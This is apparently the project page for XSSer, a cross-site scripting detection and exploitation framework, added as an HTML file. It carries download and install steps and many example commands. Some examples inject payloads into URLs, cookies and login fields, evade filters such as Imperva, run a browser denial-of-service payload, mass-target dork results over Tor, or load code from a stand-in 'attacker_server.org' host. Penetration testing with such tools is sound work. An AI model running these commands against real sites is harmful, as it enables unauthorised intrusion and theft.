@@ -1,0 +1,191 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>XSSer: Automatic -framework- to detect, exploit, and report XSS</title>
+</head><body>https://xsser.03c8.net/ <br/>
+https://github.com/epsylon/xsser <br/>
+<br/>
+News:<br/>
+XSSer (v1.7.1 &quot;Zika&quot;) has been added to Kali Linux (2016).<br/>
+Introduction:<br/>
+Cross Site &quot;Scripter&quot; (aka XSSer) is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications.<br/>
+<br/>
+Current version:<br/>
+XSSer v1.7 -&gt; ZiKA-47 Swarm!<br/>
+<br/>
+XSSer ZiKA-47 Swarm<br/>
+Download (.tar.gz): XSSer v1.7-1.tar.gz<br/>
+<br/>
+wget http://xsser.03c8.net/xsser/xsser_1.7-1.tar.gz<br/>
+<br/>
+tar xf xsser_1.7-1.tar.gz<br/>
+cd xsser_1.7-1<br/>
+cd xsser-public<br/>
+python setup.py install<br/>
+./xsser -h<br/>
+./xsser --gtk (for gui)<br/>
+<br/>
+Download (.zip): XSSer v1.7-1.zip<br/>
+<br/>
+Torrent (.tar.gz): XSSer v1.7-1.tar.gz.torrent<br/>
+Torrent (.zip): XSSer v1.7-1.zip.torrent<br/>
+<br/>
+(checksums)<br/>
+<br/>
+git clone https://github.com/epsylon/xsser<br/>
+<br/>
+Packages:<br/>
+XSSer v1.7: &quot;ZiKA-47 Swarm!&quot; (more updated):<br/>
+Ubuntu/Debian (64-bits) package: xsser_1.7-1_amd64.deb -&gt; 94f2f4b75166527939fba2e78dc56f36<br/>
+<br/>
+wget http://xsser.03c8.net/xsser/xsser_1.7-1_amd64.deb<br/>
+sudo dpkg -i xsser_1.7-1_amd64.deb <br/>
+xsser -h<br/>
+xsser --gtk (for gui)<br/>
+---------------------<br/>
+XSSer v1.6: &quot;Grey Swarm!&quot;:<br/>
+Download (.tar.gz): XSSer v1.6-1.tar.gz -&gt; f61d42a8b986c66963244bf7c02119f2<br/>
+<br/>
+RPM package: XSSer-1.6-1.noarch.rpm<br/>
+<br/>
+Ubuntu/Debian package: XSSer-1.6_all.deb<br/>
+---------------------<br/>
+XSSer v1.5: &quot;Swarm Edition!&quot;:<br/>
+Ubuntu/Debian: xsser_1.5-1_all.deb.tar.gz<br/>
+---------------------<br/>
+XSSer v1.0: &quot;The mosquito&quot;:<br/>
+Ubuntu/Debian: xsser_1.0-2_all.deb.tar.gz<br/>
+Captures:<br/>
+- Manifesto:<br/>
+<br/>
+XSSer ZiKA-47 Swarm<br/>
++Zoom<br/>
+<br/>
+---------------------<br/>
+- Configuration (works with Tor):<br/>
+<br/>
+XSSer ZiKA-47 Swarm<br/>
++Zoom<br/>
+<br/>
+---------------------<br/>
+- Global Map:<br/>
+<br/>
+XSSer ZiKA-47 Swarm<br/>
++Zoom<br/>
+<br/>
+---------------------<br/>
+- Spidering:<br/>
+<br/>
+XSSer ZiKA-47 Swarm<br/>
++Zoom<br/>
+<br/>
+Documentation:<br/>
+2012 at RootedCon | Slides: &quot;XSSer - The Cross Site Scripting framework&quot;: Spanish | Video: Spanish<br/>
+<br/>
+2011 at THSF'11 | Slides: &quot;XSSer - The Mosquito&quot;: English<br/>
+<br/>
+2009 at Cyberspace | Paper: &quot;XSS for fun and profit&quot;: English | Spanish<br/>
+<br/>
+Installation:<br/>
+XSSer runs on many platforms. It requires Python and the following libraries:<br/>
+<br/>
+python-pycurl - Python bindings to libcurl<br/>
+python-xmlbuilder - create xml/(x)html files - Python 2.x<br/>
+python-beautifulsoup - error-tolerant HTML parser for Python<br/>
+python-geoip - Python bindings for the GeoIP IP-to-country resolver library<br/>
+On Debian-based systems (ex: Ubuntu), run:<br/>
+<br/>
+sudo apt-get install python-pycurl python-xmlbuilder python-beautifulsoup python-geoip<br/>
+<br/>
+Examples:<br/>
+* View HELP (Available commands):<br/>
+<br/>
+xsser -h (--help)<br/>
+* Check for latest stable version:<br/>
+<br/>
+xsser --update<br/>
+* Launch GTK interface (GUI):<br/>
+<br/>
+xsser --gtk<br/>
+* Simple injection from URL:<br/>
+<br/>
+xsser -u &quot;http://host.com&quot;<br/>
+* Simple injection from File, with Tor proxy and spoofing HTTP Referer headers:<br/>
+<br/>
+xsser -i &quot;file.txt&quot; --proxy &quot;http://127.0.0.1:8118&quot; --referer &quot;666.666.666.666&quot; <br/>
+* Multiple injections from URL, with automatic payloading, establishing a reverse connection (to certify that target is 100% vulnerable) and showing statistics:<br/>
+<br/>
+xsser -u &quot;http://host.com&quot; --auto --reverse-check -s<br/>
+* Multiple injections from URL, with automatic payloading, using Tor proxy, using &quot;Hexadecimal&quot; encoding, with verbose output and saving results to file (XSSreport.raw):<br/>
+<br/>
+xsser -u &quot;http://host.com&quot; --auto --proxy &quot;http://127.0.0.1:8118&quot; --Hex --verbose --save<br/>
+* Multiple injections from URL, with automatic payloading, using character encoding mutations (first, changing payload to 'Hexadecimal'; second, changing to 'StringFromCharCode' the first one; third, reencoding to 'Hexadecimal' the second one), with HTTP User-Agent spoofed, changing timeout to &quot;20&quot; and using multithreads (5 threads):<br/>
+<br/>
+xsser -u &quot;http://host.com&quot; --auto --Cem &quot;Hex,Str,Hex&quot; --user-agent &quot;XSSer Pentesting Tool&quot; --timeout &quot;20&quot; --threads &quot;5&quot;<br/>
+* Advanced injection from File, payloading your -own- code and using Unescape() character encoding to bypass filters:<br/>
+<br/>
+xsser -i &quot;urls.txt&quot; --payload &quot;!enter your injection code here!&quot; --Une<br/>
+* Injection from Dork, selecting &quot;google&quot; as search engine:<br/>
+<br/>
+xsser --De &quot;google&quot; -d &quot;search.php?q=&quot;<br/>
+* Injection from a list of Dorks extracted from a file (provided by XSSer) and using all search engines supported (XSSer Storm!):<br/>
+<br/>
+xsser -l --Da<br/>
+* Injection from Crawler with deep 3 and 4 pages to review (XSSer Spider!):<br/>
+<br/>
+xsser -c3 --Cw=4 -u &quot;http://host.com&quot;<br/>
+* Simple injection from URL, to a POST parameter (ex: password), with statistics results:<br/>
+<br/>
+xsser -u &quot;http://host.com/index.php&quot; -p &quot;target=login&amp;user=admin&amp;password=XSS&quot; -s<br/>
+* Multiple injections to multiple parameters, using POST:<br/>
+<br/>
+xsser -u &quot;http://host.com/index.php&quot; -p &quot;target=XSS&amp;user=XSS&amp;password=XSS&quot; --auto<br/>
+* Simple injection from URL, using GET, injecting on Cookie, trying to use DOM shadow space (no server logging!) and if exists any vulnerability, exploiting your -own- final code:<br/>
+<br/>
+xsser -u &quot;http://host.com&quot; -g &quot;/path?vuln=XSS&quot; --Coo --Dom --Fp=&quot;!enter your injection code here!&quot;<br/>
+* Simple injection from URL, using GET and if exists any vulnerability, exploiting a DoS (Denegation Of Service) code for browsers:<br/>
+<br/>
+xsser -u &quot;http://host.com&quot; -g &quot;/path?vuln=XSS&quot; --Dos<br/>
+* Multiple injections to multiple places, extracting targets from a File, applying automatic payloading, changing timeout to &quot;20&quot; and using multithreads (5 threads), increasing delay between requests to 10 seconds, injecting parameters in HTTP USer-Agent, HTTP Referer and Cookies, using proxy Tor, with IP Octal obfuscation, with statistics results and using verbose mode (real playing mode!): <br/>
+<br/>
+xsser -i &quot;list_of_url_targets.txt&quot; --auto --timeout &quot;20&quot; --threads &quot;5&quot; --delay &quot;10&quot; --Xsa --Xsr --Coo --proxy &quot;http://127.0.0.1:8118&quot; --Doo -s --verbose<br/>
+* Injection of a XSS code provided by user on a -fake- image:<br/>
+<br/>
+xsser --Imx &quot;test.png&quot; --payload &quot;!enter your injection code here!&quot; <br/>
+<br/>
+* Report output 'positives' injections from a dorking search (using all search engines) to a XML file:<br/>
+<br/>
+xsser -d &quot;login.php&quot; --Da --xml &quot;security_report_XSSer_Dork_login-php_allengines.xml&quot; <br/>
+* Create a Flash movie with a standard XSS code embedded:<br/>
+<br/>
+xsser --fla &quot;movie.swf&quot;<br/>
+* Send a pre-checking hash to see if target is generating -false positive- replies:<br/>
+<br/>
+xsser -u &quot;http://host.com&quot; --hash<br/>
+* Discover parameters filtered by using heuristics:<br/>
+<br/>
+xsser -u &quot;http://host.com&quot; --heuristic<br/>
+* Exploiting Base64 code encoding in META tag (rfc2397) after inject a manual payload:<br/>
+<br/>
+xsser -u &quot;http://host.com&quot; -g &quot;/path?vuln=XSS&quot; --payload &quot;!enter your injection code here!&quot; --B64<br/>
+* Exploiting your &quot;own&quot; -remote code- in a payload discovered using automatic fuzzing:<br/>
+<br/>
+xsser -u &quot;http://host.com&quot; -g &quot;/path?vuln=XSS&quot; --auto --Fr &quot;https://attacker_server.org/path/code.js&quot;<br/>
+* Apply an Anti-antiXSS bypasser (ex: Imperva) before to inject you -own- code and using verbose output:<br/>
+<br/>
+xsser -u &quot;http://host.com&quot; -g &quot;/path?vuln=XSS&quot; --Imperva --payload &quot;!enter your injection code here!&quot; -v<br/>
+License:<br/>
+XSSer is released under the terms of the General Public License v3 and is copyrighted by psy.<br/>
+<br/>
+Support:<br/>
+XSSer has been one of the winner projects of the NLnet Awards of April (2010).<br/>
+XSSer has been added to BackTrack Linux (2010).<br/>
+XSSer has been added to OWASP project (2012).<br/>
+XSSer has been added to Cyborg Linux (2015).<br/>
+XSSer has been added to Kali Linux (2016).<br/>
+XSSer has been added to BlackArch (2016).<br/>
+This framework is actively looking for new sponsors and funding. <br/>
+<br/>
+If you or your organization has an interest in keeping XSSer, please contact directly.<br/>
+<br/>
+To donate some bitcoins: 19aXfJtoYJUoXEZtjNwsah2JKN9CK5Pcjw</body></html>
